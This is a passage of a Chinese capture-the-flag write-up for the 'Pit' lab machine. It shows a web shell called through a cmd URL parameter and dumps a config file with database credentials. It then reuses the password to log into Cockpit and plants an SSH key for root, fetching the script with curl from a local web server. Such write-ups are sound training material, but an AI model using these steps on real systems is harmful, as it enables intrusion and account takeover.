+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/etcpasswd.png" alt="etcpasswd"></p>
+<p>浏览目录文件在<code>/var/www/html/seeddms51x/conf</code>目录下发现了配置文件<code>settings.xml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=ls /var/www/html/seeddms51x/conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.png" alt="配置信息"></p>
+<p><strong>settings.xml</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">site</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- siteName: Name of site used in the page titles. Default: SeedDMS</span></span><br><span class="line"><span class="comment">       - foot<span class="doctag">Note:</span> Message to display at the bottom of every page</span></span><br><span class="line"><span class="comment">       - printDisclaimer: if true the disclaimer message the lang.inc files will be print on the bottom of the page</span></span><br><span class="line"><span class="comment">       - language: default language (name of a subfolder in folder &quot;languages&quot;)</span></span><br><span class="line"><span class="comment">       - theme: default style (name of a subfolder in folder &quot;styles&quot;)</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display</span> <span class="attr">siteName</span>=<span class="string">&quot;SeedDMS&quot;</span> <span class="attr">footNote</span>=<span class="string">&quot;SeedDMS free document management system - www.seeddms.org&quot;</span> <span class="attr">printDisclaimer</span>=<span class="string">&quot;true&quot;</span> <span class="attr">language</span>=<span class="string">&quot;en_GB&quot;</span> <span class="attr">theme</span>=<span class="string">&quot;bootstrap&quot;</span> <span class="attr">previewWidthList</span>=<span class="string">&quot;40&quot;</span> <span class="attr">previewWidthDetail</span>=<span class="string">&quot;100&quot;</span> <span class="attr">availablelanguages</span>=<span class="string">&quot;&quot;</span> <span class="attr">showFullPreview</span>=<span class="string">&quot;false&quot;</span> <span class="attr">convertToPdf</span>=<span class="string">&quot;false&quot;</span> <span class="attr">previewWidthMenuList</span>=<span class="string">&quot;40&quot;</span> <span class="attr">previewWidthDropFolderList</span>=<span class="string">&quot;100&quot;</span> <span class="attr">maxItemsPerPage</span>=<span class="string">&quot;0&quot;</span> <span class="attr">incItemsPerPage</span>=<span class="string">&quot;0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- strictFormCheck: Strict form checking. If set to true, then all fields in the form will be checked for a value. If set to false, then (most) comments and keyword fields become optional. Comments are always required when submitting a review or overriding document status.</span></span><br><span class="line"><span class="comment">       - viewOnlineFileTypes: files with one of the following endings can be viewed online (USE ONLY LOWER CASE CHARACTERS)</span></span><br><span class="line"><span class="comment">       - enableConverting: enable/disable converting of files</span></span><br><span class="line"><span class="comment">       - enableEmail: enable/disable automatic email notification</span></span><br><span class="line"><span class="comment">       - enableUsersView: enable/disable group and user view for all users</span></span><br><span class="line"><span class="comment">       - enableFullSearch: false to don&#x27;t use fulltext search</span></span><br><span class="line"><span class="comment">       - enableLanguageSelector: false to don&#x27;t show the language selector after login</span></span><br><span class="line"><span class="comment">       - enableClipboard: false to hide the clipboard</span></span><br><span class="line"><span class="comment">       - enableFolderTree: false to don&#x27;t show the folder tree</span></span><br><span class="line"><span class="comment">       - expandFolderTree: 0 to start with tree hidden</span></span><br><span class="line"><span class="comment">       -                   1 to start with tree shown and first level expanded</span></span><br><span class="line"><span class="comment">       -                   2 to start with tree shown fully expanded     </span></span><br><span class="line"><span class="comment">       - stopWordsFile: path to stop word file for indexer</span></span><br><span class="line"><span class="comment">       - sortUsersInList: how to sort users in lists (&#x27;fullname&#x27; or &#x27;&#x27; (default))</span></span><br><span class="line"><span class="comment">    --&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">edition</span> <span class="attr">strictFormCheck</span>=<span class="string">&quot;false&quot;</span> <span class="attr">viewOnlineFileTypes</span>=<span class="string">&quot;.txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg&quot;</span> <span class="attr">enableConverting</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableEmail</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableUsersView</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableFullSearch</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableClipboard</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableFolderTree</span>=<span class="string">&quot;true&quot;</span> <span class="attr">expandFolderTree</span>=<span class="string">&quot;1&quot;</span> <span class="attr">enableLanguageSelector</span>=<span class="string">&quot;true&quot;</span> <span class="attr">stopWordsFile</span>=<span class="string">&quot;&quot;</span> <span class="attr">sortUsersInList</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableDropUpload</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableRecursiveCount</span>=<span class="string">&quot;false&quot;</span> <span class="attr">maxRecursiveCount</span>=<span class="string">&quot;0&quot;</span> <span class="attr">enableThemeSelector</span>=<span class="string">&quot;false&quot;</span> <span class="attr">fullSearchEngine</span>=<span class="string">&quot;sqlitefts&quot;</span> <span class="attr">sortFoldersDefault</span>=<span class="string">&quot;u&quot;</span> <span class="attr">editOnlineFileTypes</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableMenuTasks</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableHelp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">defaultSearchMethod</span>=<span class="string">&quot;database&quot;</span> <span class="attr">libraryFolder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">maxSizeForFullText</span>=<span class="string">&quot;0&quot;</span> <span class="attr">showSingleSearchHit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableSessionList</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableDropFolderList</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableMultiUpload</span>=<span class="string">&quot;false&quot;</span> <span class="attr">defaultDocPosition</span>=<span class="string">&quot;end&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edition</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- enableCalendar: enable/disable calendar</span></span><br><span class="line"><span class="comment">       - calendarDefaultView: calendar default view (&quot;w&quot; for week,&quot;m&quot; for month,&quot;y&quot; for year)</span></span><br><span class="line"><span class="comment">       - firstDayOfWeek: first day of the week (0=sunday, 6=saturday)</span></span><br><span class="line"><span class="comment">    --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">calendar</span> <span class="attr">enableCalendar</span>=<span class="string">&quot;true&quot;</span> <span class="attr">calendarDefaultView</span>=<span class="string">&quot;y&quot;</span> <span class="attr">firstDayOfWeek</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">calendar</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">webdav</span> <span class="attr">enableWebdavReplaceDoc</span>=<span class="string">&quot;true&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">site</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">system</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- rootDir: Path to where SeedDMS is located</span></span><br><span class="line"><span class="comment">       - httpRoot: The relative path in the URL, after the domain part. Do not include the</span></span><br><span class="line"><span class="comment">       -           http:// prefix or the web host name. e.g. If the full URL is</span></span><br><span class="line"><span class="comment">	     -           http://www.example.com/seeddms/, set $_httpRoot = &quot;/seeddms/&quot;.</span></span><br><span class="line"><span class="comment">	     -           If the URL is http://www.example.com/, set $_httpRoot = &quot;/&quot;.</span></span><br><span class="line"><span class="comment">       - contentDir: Where the uploaded files are stored (best to choose a directory that</span></span><br><span class="line"><span class="comment">       -             is not accessible through your web-server)</span></span><br><span class="line"><span class="comment">       - stagingDir: Where partial file uploads are saved</span></span><br><span class="line"><span class="comment">       - luceneDir: Where the lucene fulltext index iѕ saved</span></span><br><span class="line"><span class="comment">       - logFileEnable: set false to disable log system</span></span><br><span class="line"><span class="comment">       - logFileRotation: the log file rotation (h=hourly, d=daily, m=monthly)</span></span><br><span class="line"><span class="comment">       - enableLargeFileUpload: support for jumploader</span></span><br><span class="line"><span class="comment">       - partitionsize: size of chunk uploaded by jumploader</span></span><br><span class="line"><span class="comment">       - dropFolderDir: where files for document upload are located</span></span><br><span class="line"><span class="comment">       - cacheDir: where the preview images are saved</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span> <span class="attr">rootDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/seeddms/&quot;</span> <span class="attr">httpRoot</span>=<span class="string">&quot;/seeddms51x/seeddms/&quot;</span> <span class="attr">contentDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/&quot;</span> <span class="attr">stagingDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/staging/&quot;</span> <span class="attr">luceneDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/lucene/&quot;</span> <span class="attr">logFileEnable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">logFileRotation</span>=<span class="string">&quot;d&quot;</span> <span class="attr">enableLargeFileUpload</span>=<span class="string">&quot;false&quot;</span> <span class="attr">partitionSize</span>=<span class="string">&quot;2000000&quot;</span> <span class="attr">cacheDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/cache/&quot;</span> <span class="attr">dropFolderDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">backupDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">repositoryUrl</span>=<span class="string">&quot;&quot;</span> <span class="attr">maxUploadSize</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableXsendfile</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- enableGuestLogin: If you want anybody to login as guest, set the following line to true</span></span><br><span class="line"><span class="comment">       -                   <span class="doctag">note:</span> guest login should be used only in a trusted environment</span></span><br><span class="line"><span class="comment">			 - enablePasswordForgotten: Allow users to reset their password</span></span><br><span class="line"><span class="comment">       - restricted: Restricted access: only allow users to log in if they have an entry in the local database (irrespective of successful authentication with LDAP).</span></span><br><span class="line"><span class="comment">       - enableUserImage: enable users images</span></span><br><span class="line"><span class="comment">       - disableSelfEdit: if true user cannot edit his own profile</span></span><br><span class="line"><span class="comment">			 - passwordStrength: minimum strength of password, set to 0 to disable</span></span><br><span class="line"><span class="comment">			 - passwordExpiration: number of days after password expires</span></span><br><span class="line"><span class="comment">			 - passwordHistory: number of remembered passwords</span></span><br><span class="line"><span class="comment">			 - passwordStrengthAlgorithm: algorithm used to calculate password strenght (simple or advanced)</span></span><br><span class="line"><span class="comment">			 - encryptionKey: arbitrary string used for creating identifiers</span></span><br><span class="line"><span class="comment">    --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">authentication</span> <span class="attr">enableGuestLogin</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enablePasswordForgotten</span>=<span class="string">&quot;false&quot;</span> <span class="attr">restricted</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableUserImage</span>=<span class="string">&quot;false&quot;</span> <span class="attr">disableSelfEdit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">passwordStrength</span>=<span class="string">&quot;0&quot;</span> <span class="attr">passwordStrengthAlgorithm</span>=<span class="string">&quot;simple&quot;</span> <span class="attr">passwordExpiration</span>=<span class="string">&quot;10&quot;</span> <span class="attr">passwordHistory</span>=<span class="string">&quot;0&quot;</span> <span class="attr">loginFailure</span>=<span class="string">&quot;0&quot;</span> <span class="attr">autoLoginUser</span>=<span class="string">&quot;0&quot;</span> <span class="attr">quota</span>=<span class="string">&quot;0&quot;</span> <span class="attr">undelUserIds</span>=<span class="string">&quot;&quot;</span> <span class="attr">encryptionKey</span>=<span class="string">&quot;cfecb42d13f2e1666cddde56991a2cbf&quot;</span> <span class="attr">cookieLifetime</span>=<span class="string">&quot;0&quot;</span> <span class="attr">enableGuestAutoLogin</span>=<span class="string">&quot;false&quot;</span> <span class="attr">defaultAccessDocs</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">connectors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ***** CONNECTOR LDAP  *****</span></span><br><span class="line"><span class="comment">           - enable: enable/disable connector</span></span><br><span class="line"><span class="comment">           - type: type of connector ldap / AD</span></span><br><span class="line"><span class="comment">           - host: hostname of the authentification server</span></span><br><span class="line"><span class="comment">           -       URIs are supported, e.g.: ldaps://ldap.host.com</span></span><br><span class="line"><span class="comment">           - port: port of the authentification server</span></span><br><span class="line"><span class="comment">           - baseDN: top level of the LDAP directory tree</span></span><br><span class="line"><span class="comment">        --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">connector</span> <span class="attr">enable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">type</span>=<span class="string">&quot;ldap&quot;</span> <span class="attr">host</span>=<span class="string">&quot;ldaps://ldap.host.com&quot;</span> <span class="attr">port</span>=<span class="string">&quot;389&quot;</span> <span class="attr">baseDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">bindDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">bindPw</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ***** CONNECTOR Microsoft Active Directory  *****</span></span><br><span class="line"><span class="comment">           - enable: enable/disable connector</span></span><br><span class="line"><span class="comment">           - type: type of connector ldap / AD</span></span><br><span class="line"><span class="comment">           - host: hostname of the authentification server</span></span><br><span class="line"><span class="comment">           - port: port of the authentification server</span></span><br><span class="line"><span class="comment">           - baseDN: top level of the LDAP directory tree</span></span><br><span class="line"><span class="comment">           - accountDomainName: sample: example.com</span></span><br><span class="line"><span class="comment">        --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">connector</span> <span class="attr">enable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">type</span>=<span class="string">&quot;AD&quot;</span> <span class="attr">host</span>=<span class="string">&quot;ldap.example.com&quot;</span> <span class="attr">port</span>=<span class="string">&quot;389&quot;</span> <span class="attr">baseDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">accountDomainName</span>=<span class="string">&quot;example.com&quot;</span> <span class="attr">bindDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">bindPw</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">connectors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">authentication</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       - dbDriver: DB-Driver used by adodb (see adodb-readme)</span></span><br><span class="line"><span class="comment">       - dbHostname: DB-Server</span></span><br><span class="line"><span class="comment">       - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)</span></span><br><span class="line"><span class="comment">       - dbUser: username for database-access</span></span><br><span class="line"><span class="comment">       - dbPass: password for database-access</span></span><br><span class="line"><span class="comment">    --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">database</span> <span class="attr">dbDriver</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbHostname</span>=<span class="string">&quot;localhost&quot;</span> <span class="attr">dbDatabase</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbUser</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbPass</span>=<span class="string">&quot;ied^ieY6xoquu&quot;</span> <span class="attr">doNotCheckVersion</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- smtpServer: SMTP Server hostname</span></span><br><span class="line"><span class="comment">       - smtpPort: SMTP Server port</span></span><br><span class="line"><span class="comment">       - smtpSendFrom: Send from</span></span><br><span class="line"><span class="comment">    --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">smtp</span> <span class="attr">smtpServer</span>=<span class="string">&quot;localhost&quot;</span> <span class="attr">smtpPort</span>=<span class="string">&quot;25&quot;</span> <span class="attr">smtpSendFrom</span>=<span class="string">&quot;seeddms@localhost&quot;</span> <span class="attr">smtpUser</span>=<span class="string">&quot;&quot;</span> <span class="attr">smtpPassword</span>=<span class="string">&quot;&quot;</span>/&gt;</span>    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">system</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">advanced</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- siteDefaultPage: Default page on login. Defaults to out/out.ViewFolder.php</span></span><br><span class="line"><span class="comment">       - rootFolderID: ID of root-folder (mostly no need to change)</span></span><br><span class="line"><span class="comment">       - titleDisplay<span class="doctag">Hack:</span> Workaround for page titles that go over more than 2 lines.</span></span><br><span class="line"><span class="comment">    --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">display</span> <span class="attr">siteDefaultPage</span>=<span class="string">&quot;&quot;</span> <span class="attr">rootFolderID</span>=<span class="string">&quot;1&quot;</span> <span class="attr">titleDisplayHack</span>=<span class="string">&quot;true&quot;</span> <span class="attr">showMissingTranslations</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- guestID: ID of guest-user used when logged in as guest (mostly no need to change)</span></span><br><span class="line"><span class="comment">       - adminIP: if enabled admin can login only by specified IP addres, leave empty to avoid the control</span></span><br><span class="line"><span class="comment">       -          <span class="doctag">NOTE:</span> works only with local autentication (no LDAP)</span></span><br><span class="line"><span class="comment">    --&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">authentication</span> <span class="attr">guestID</span>=<span class="string">&quot;2&quot;</span> <span class="attr">adminIP</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">authentication</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- enableAdminRevApp: false to don&#x27;t list administrator as reviewer/approver</span></span><br><span class="line"><span class="comment">       - versioningFileName: the name of the versioning info file created by the backup tool</span></span><br><span class="line"><span class="comment">       - workflowMode: &#x27;traditional&#x27; or &#x27;advanced&#x27;</span></span><br><span class="line"><span class="comment">       - enableVersionDeletion: allow to delete versions after approval</span></span><br><span class="line"><span class="comment">       - enableVersionModification: allow to modify versions after approval</span></span><br><span class="line"><span class="comment">       - enableDuplicateDocNames: allow duplicate names in a folder</span></span><br><span class="line"><span class="comment">    --&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">edition</span> <span class="attr">enableAdminRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">versioningFileName</span>=<span class="string">&quot;versioning_info.txt&quot;</span> <span class="attr">workflowMode</span>=<span class="string">&quot;traditional&quot;</span> <span class="attr">enableVersionDeletion</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableVersionModification</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableDuplicateDocNames</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableOwnerRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableSelfRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">presetExpirationDate</span>=<span class="string">&quot;&quot;</span> <span class="attr">overrideMimeType</span>=<span class="string">&quot;false&quot;</span> <span class="attr">initialDocumentStatus</span>=<span class="string">&quot;0&quot;</span> <span class="attr">enableAcknowledgeWorkflow</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableRevisionWorkflow</span>=<span class="string">&quot;&quot;</span> <span class="attr">advancedAcl</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableUpdateRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">removeFromDropFolder</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allowReviewerOnly</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edition</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- enableNotificationAppRev: true to send notifation if a user is added as a reviewer or approver</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">notification</span> <span class="attr">enableNotificationAppRev</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableOwnerNotification</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableNotificationWorkflow</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">notification</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- coreDir: Path to SeedDMS_Core (optional)</span></span><br><span class="line"><span class="comment">       - luceneClassDir: Path to SeedDMS_Lucene (optional)</span></span><br><span class="line"><span class="comment">       - contentOffsetDir: To work around limitations in the underlying file system, a new </span></span><br><span class="line"><span class="comment">       -                   directory structure has been devised that exists within the content </span></span><br><span class="line"><span class="comment">       -                   directory ($_contentDir). This requires a base directory from which </span></span><br><span class="line"><span class="comment">       -                   to begin. Usually leave this to the default setting, 1048576, but can </span></span><br><span class="line"><span class="comment">       -                   be any number or string that does not already exist within $_contentDir.	</span></span><br><span class="line"><span class="comment">       - maxDirID: Maximum number of sub-directories per parent directory. Default: 0, use 31998 (maximum number of dirs in ext3) for a multi level content directory.</span></span><br><span class="line"><span class="comment">       - updateNotifyTime: users are notified about document-changes that took place within the last &quot;updateNotifyTime&quot; seconds</span></span><br><span class="line"><span class="comment">       - extraPath: Path to addtional software. This is the directory containing additional software like the adodb directory, or the pear Log package. This path will be added to the php include path</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span> <span class="attr">coreDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">luceneClassDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">contentOffsetDir</span>=<span class="string">&quot;1048576&quot;</span> <span class="attr">maxDirID</span>=<span class="string">&quot;0&quot;</span> <span class="attr">updateNotifyTime</span>=<span class="string">&quot;86400&quot;</span> <span class="attr">extraPath</span>=<span class="string">&quot;/var/www/html/seeddms51x/pear/&quot;</span> <span class="attr">maxExecutionTime</span>=<span class="string">&quot;30&quot;</span> <span class="attr">cmdTimeout</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">converters</span> <span class="attr">target</span>=<span class="string">&quot;fulltext&quot;</span>&gt;</span></span><br><span class="line">		 <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/pdf&quot;</span>&gt;</span>pdftotext -nopgbrk %s - | sed -e &#x27;s/ [a-zA-Z0-9.]\&#123;1\&#125; / /g&#x27; -e &#x27;s/[0-9.]//g&#x27;<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/msword&quot;</span>&gt;</span>catdoc %s<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/vnd.ms-excel&quot;</span>&gt;</span>ssconvert -T Gnumeric_stf:stf_csv -S %s fd://1<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;audio/mp3&quot;</span>&gt;</span>id3 -l -R %s | egrep &#x27;(Title|Artist|Album)&#x27; | sed &#x27;s/^[^:]*: //g&#x27;<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;audio/mpeg&quot;</span>&gt;</span>id3 -l -R %s | egrep &#x27;(Title|Artist|Album)&#x27; | sed &#x27;s/^[^:]*: //g&#x27;<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span>cat %s<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">converters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">advanced</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">extensions</span>&gt;</span><span class="tag">&lt;<span class="name">extension</span> <span class="attr">name</span>=<span class="string">&quot;example&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">extensions</span>&gt;</span><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中发现了数据库的账号密码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">database</span> <span class="attr">dbDriver</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbHostname</span>=<span class="string">&quot;localhost&quot;</span> <span class="attr">dbDatabase</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbUser</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbPass</span>=<span class="string">&quot;ied^ieY6xoquu&quot;</span> <span class="attr">doNotCheckVersion</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是<code>/etc/passwd</code>中mysql为<code>/sbin/nologin</code>，解释如下：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If  the file /etc/nologin exists and is readable, login(1) will allow access only to root.</span><br><span class="line">Other users will be shown the contents of this file and  their  logins  will  be  refused.</span><br><span class="line">This provides a simple way of temporarily disabling all unprivileged logins.</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>就是禁止以账户的的方式登录，通常由许多需要账户但不想通过授予登陆访问权限而造成安全问题的系统服务器使用，那这里没法通过<strong>远程命令执行</strong>用数据库账号密码来查询数据了</p>
+<p>上面我们已经知道9090端口可以登录Cockpit，且<strong>root</strong>和<strong>michelle</strong>两个用户使用<code>/bin/bash</code>，结合Cockpit控制台的作用，我们尝试用<code>username:michelle/password:ied^ieY6xoquu</code>登录cockpit，成功登录！</p>
+<p>在<strong>Accounts</strong>中，发现确实存在<strong>root</strong>和<strong>michelle</strong>两个用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_usertxt.png" alt="usertxt"></p>
+<p>用Cockpit自带的终端找到user.txt</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先用<code>sudo -l</code>列出目前用户可执行与无法执行的指令，发现<strong>michelle</strong>用户不能执行<code>sudo</code>命令，另寻他法</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pit_sudo-l.png" alt="sudo-l"></p>
+<p>回到snmp文件，发现<code>/usr/bin/monitor</code>,monitor是一个文件，用<code>cat</code>命令看看写了啥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF3.png" alt="泄露信息3"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/monitor.png" alt="monitor"></p>
+<p>进入<code>/usr/local/monitoring</code>目录，可以看但我们只有<code>wx</code>权限。向目录写入一个脚本文件，<code>cat</code>以后成功输出了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8C.png" alt="不可执行"></p>
+<p>结合在<strong>Accounts</strong>中的发现，我们可以向<code>/root/.ssh</code>写入一个密钥来绕过SSH密码登录root账户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hint2.png" alt="hint2"></p>
+<p>在本地生成一对密钥，会产生<strong>xxx.pub</strong>和<strong>xxx</strong>两个文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/createkey.png" alt="createkey"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/publickey.png" alt="publickey"></p>
+<p>写一个shell脚本来写入我们的密钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/checkme.png" alt="checkme"></p>
+<p>在本地一起个web服务<code>python -m http.server 80</code>，并在Cockpit终端中用<code>curl</code>命令来获取本地的shell脚本，用<code>cat</code>执行脚本</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/writekey.png" alt="writekey"></p>
